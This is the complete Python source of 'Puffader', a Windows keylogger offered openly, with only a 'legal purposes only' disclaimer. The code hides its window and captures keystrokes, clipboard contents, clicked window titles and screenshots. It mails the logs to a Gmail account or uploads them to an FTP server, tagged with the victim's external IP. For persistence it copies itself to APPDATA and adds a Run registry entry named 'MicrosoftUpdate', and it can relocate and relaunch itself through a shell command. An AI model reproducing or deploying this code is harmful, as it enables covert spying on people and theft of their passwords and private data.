'''
Puffader Windows Keylogger by xp4xbox
https://github.com/xp4xbox/Puffader

Copyright (c) 2017 xp4xbox
MIT License: https://github.com/xp4xbox/Puffader/blob/master/LICENSE

NOTE: This program must be used for legal purposes only! I am not responsible for anything you do with it.
'''

import smtplib, time, os, threading, sys, subprocess
import win32console, win32gui, win32event, win32api, winerror, win32clipboard
from sys import exit; from ftplib import FTP; from urllib2 import urlopen; from shutil import copyfile
from email.MIMEMultipart import MIMEMultipart; from email.MIMEImage import MIMEImage; from _winreg import *
try:
    import pythoncom, pyHook, pyautogui
    from pyHook import GetKeyState, HookConstants
except ImportError:
    print "required pyhook, pywin32 and pyautogui"
    exit()


strEmailAc = "email@gmail.com"
strEmailPass = "pass"

blnFTP = "False"  # if using ftp set this to True and configure the options below
strFtpServer = ""
intFtpPort = 21
strFtpUser = ""
strFtpPass = ""
strFtpRemotePath = "/"

intCharPerSend = 1000  # set num of chars before send log/store

blnUseTime = "False"  # if you prefer to use a timer to send/save logs, set this to True
intTimePerSend = 120  # set how often to send/save logs in seconds

blnStoreLocal = "False"  # True to save logs/screens locally
strLogFile = ""  # set non-protected path to text file eg. c:/temp/test.txt

blnScrShot = "False"  # set to True for capturing screenshots
strScrDir = ""  # set non-protected dir for scrshot location if storing locally. eg c:/temp
intScrTime = 120  # set time for taking screen in seconds

blnLogClick = "False"  # for logging window clicks
blnAddToStartup = "False"

blnLogClipboard = "False"
blnMelt = "False"


def hide():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True
# hide window as new thread. Necessary in order to define timer used later
objTimer = threading.Timer(0, hide); objTimer.start()


# function to prevent multiple instances
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    exit()


def GetExIp():  # function to get external ip
    global strExIP
    try:
        strExIP = urlopen("http://ident.me").read().decode('utf8')
    except:
        strExIP = "?"
# obj defined for later use for screenshot timer
objTimer2 = threading.Timer(0, GetExIp); objTimer2.start()


def melt():
    TMP = os.environ["TEMP"]
    strNewFile = TMP + "\\" + os.path.basename(sys.argv[0])
    if not os.getcwd() == TMP:  # if the current dir is not temp
        subprocess.Popen("ping 1.1.1.1 -n 1 & move /y " + os.path.realpath(sys.argv[0]) + " " +  # move file to TMP and then relaunch
                         strNewFile + " & cd  /d " + TMP + " & " + strNewFile , shell=True)
        exit(0)

if blnMelt == "True":
    melt()


def AddToStartup():
    try:
        strPath = os.path.realpath(sys.argv[0])
        strAppPath = os.environ["APPDATA"] + "\\" + os.path.basename(strPath)
        copyfile(strPath, strAppPath)

        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
        SetValueEx(objRegKey, "MicrosoftUpdate", 0, REG_SZ, strAppPath); CloseKey(objRegKey)
    except:  # if the program is already added to startup
        pass

if blnAddToStartup == "True":
    AddToStartup()

blnFirstSend = "True"
intLogChars = 0


def MonitorClipboard():  # Function to get clipboard data
    global strLogs

    try:  # check to see if variable is defined
        strLogs
    except NameError:
        strLogs = ""

    strClipDataOld = ""

    while True:
        try:
            win32clipboard.OpenClipboard()  # open clipboard
            strClipData = win32clipboard.GetClipboardData()  # get data
            win32clipboard.CloseClipboard()
        except:  # if the contents are not supported
            strClipData = ""

        if strClipData != strClipDataOld and strClipData != "":
            strLogs += "\n" + "\n" + "* * * * * * Clipboard * * * * * *" + "\n" + strClipData + "\n" + \
                       "* * * * * * Clipboard * * * * * *" + "\n" + "\n"
            strClipDataOld = strClipData
        time.sleep(1)  # check every second

if blnLogClipboard == "True":  # if the user wants to capture clipboard data
    ClipboardThread = threading.Thread(target=MonitorClipboard)
    ClipboardThread.daemon = True
    ClipboardThread.start()


def OnKeyboardEvent(event):
    global strLogs, objTimer, intLogChars, objTimer2
    try:  # check to see if variable is defined
        strLogs
    except NameError:
        strLogs = ""

    def SendMessages(strLogs, strEmailAc, strEmailPass, strExIP):
        global blnFirstSend  # easier to just define this variable to be global within the functions
        try:
            if blnFirstSend == "True":
                strDateTime = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
                strMessage = strDateTime + "\n\n" + strLogs
                blnFirstSend = "False"
            else:
                strMessage = strLogs

            strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs From " +strExIP, strMessage)

            SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            SmtpServer.ehlo()   # identifies you to the smtp server
            SmtpServer.login(strEmailAc, strEmailPass)
            SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
            SmtpServer.close()
        except:
            time.sleep(10)  # if the email cannot be sent, try again every 10 seconds
            SendMessages(strLogs, strEmailAc, strEmailPass, strExIP)

    def SendMessagesFTP(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath):
        global blnFirstSend
        try:
            ftp = FTP(); ftp.connect(strFtpServer, 21)
            ftp.login(strFtpUser, strFtpPass); ftp.cwd(strFtpRemotePath)
            # connect to ftp server

            TMP = os.environ["TEMP"]
            objLogFile = open(TMP + "/log.txt", 'w')
            if blnFirstSend == "True":
                objLogFile.write("\n" + "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
                blnFirstSend = "False"
            objLogFile.write(strLogs)
            objLogFile.close()
            # create log file

            arFileList = ftp.nlst()
            if "log.txt" in arFileList:
                objLogFile = open(TMP + "/log.txt", 'rb'); ftp.storbinary("APPE log.txt", objLogFile)
            else:
                objLogFile = open(TMP + "/log.txt", 'rb'); ftp.storbinary("STOR log.txt", objLogFile)
            objLogFile.close(); ftp.close()
            objLogFile = open(TMP + "/log.txt", 'w'); objLogFile.close()  # delete log file contents
        except:
            time.sleep(10)  # if messages cannot be sent, try again every 10 seconds
            SendMessagesFTP(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath)

    def StoreMessagesLocal(strLogs):
        global blnFirstSend
        # log keys locally
        if os.path.isfile(strLogFile):
            objLogFile = open(strLogFile, 'a')
        else:
            objLogFile = open(strLogFile, 'w')
        if blnFirstSend == "True":
            objLogFile.write("\n" + "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
            blnFirstSend = "False"
        objLogFile.write(strLogs)
        objLogFile.close()

    def CreateNewThreadMessages():  # function for creating thread for sending messages
        if not strLogs == "":
            if blnStoreLocal == "True":
                StoreLogThread = threading.Thread(target=StoreMessagesLocal, args=strLogs)
                StoreLogThread.daemon = True
                StoreLogThread.start()
            elif blnFTP == "True":
                SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath))
                SendFTPThread.daemon = True
                SendFTPThread.start()
            else:
                SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, strExIP))
                SendMailThread.daemon = True
                SendMailThread.start()

    def SendScreen():  # function to send screens (easier to do this as a new function)
        if blnFTP == "True":
            try:
                ftp = FTP(); ftp.connect(strFtpServer, 21)
                ftp.login(strFtpUser, strFtpPass); ftp.cwd(strFtpRemotePath)
                objScrFile = open(strScrPath, "rb")
                ftp.storbinary("STOR " + strScrPath.split("/")[1], objScrFile)  # copy image to ftp
                objScrFile.close(); ftp.close()
            except:
                pass  # pass to try again later
        else:
            try:
                objMsg = MIMEMultipart()
                objMsg["Subject"] = "New Screenshot From " + strExIP
                img = MIMEImage(file(strScrPath, "rb").read())
                # attach image as original file name
                img.add_header("Content-Disposition", "attachment; filename= %s" % strScrPath.split("/")[1])
                objMsg.attach(img)
                SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465); SmtpServer.ehlo()
                SmtpServer.login(strEmailAc, strEmailPass)
                SmtpServer.sendmail(strEmailAc, strEmailAc, objMsg.as_string())
                SmtpServer.close()
            except:
                pass
        os.remove(strScrPath)  # delete file after sending

    def TakeScr():  # function to take screenshot
        if blnStoreLocal == "True":
            threading.Thread(pyautogui.screenshot().save(time.strftime(strScrDir + "/%Y%m%d%H%M%S" + ".png"))).start()
        else:
            global strScrPath
            TMP = os.environ["TEMP"]
            strScrPath = time.strftime(TMP + "/%Y%m%d%H%M%S" + ".png")  # save screenshot with datetime format
            threading.Thread(pyautogui.screenshot().save(strScrPath)).start()
            SendScreenThread = threading.Thread(target=SendScreen)
            SendScreenThread.daemon = True
            SendScreenThread.start()

    # ctrl Lshift, rshift, h to stop program
    if GetKeyState(HookConstants.VKeyToID("VK_CONTROL")) and GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) and \
            GetKeyState(HookConstants.VKeyToID("VK_LSHIFT")) and HookConstants.IDToName(event.KeyID) == "H":
        exit(0)

    if event.Ascii == 8:
        strLogs = strLogs + " [Bck] "
    elif event.Ascii == 9:
        strLogs = strLogs + " [Tab] "
    elif event.Ascii == 13:
        strLogs = strLogs + "\n"
    elif event.Ascii == 0:  # if the key is a special key such as alt, win, etc. Pass
        pass
    else:
        intLogChars += 1
        strLogs = strLogs + chr(event.Ascii)

    if blnUseTime == "True":  # if the user is sending messages by timer
        if not objTimer.is_alive():  # check to see if the timer is not active
            objTimer = threading.Timer(intTimePerSend, CreateNewThreadMessages)
            objTimer.daemon = True
            objTimer.start()
            strLogs = ""; intLogChars = 0
    else:
        if intLogChars >= intCharPerSend:  # send/save message if log is certain length
            CreateNewThreadMessages()
            strLogs = ""; intLogChars = 0

    if blnScrShot == "True":  # if the user is capturing screenshots
        if not objTimer2.is_alive():
            objTimer2 = threading.Timer(intScrTime, TakeScr)
            objTimer2.daemon = True
            objTimer2.start()

    return True  # return True to pass key to windows


def OnMouseEvent(event):  # when the mouse is clicked
    global strLogs
    try:
        strLogs
    except NameError:
        strLogs = ""

    if not str(event.WindowName) == "None":  # log window name and time
        strLogs = strLogs + "\n" + "["+time.ctime().split(" ")[3] + "] " + event.WindowName + "\n" + "====================" + "\n"
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
if blnLogClick == "True":
    hooks_manager.MouseLeftDown = OnMouseEvent
    hooks_manager.HookMouse()
pythoncom.PumpMessages()
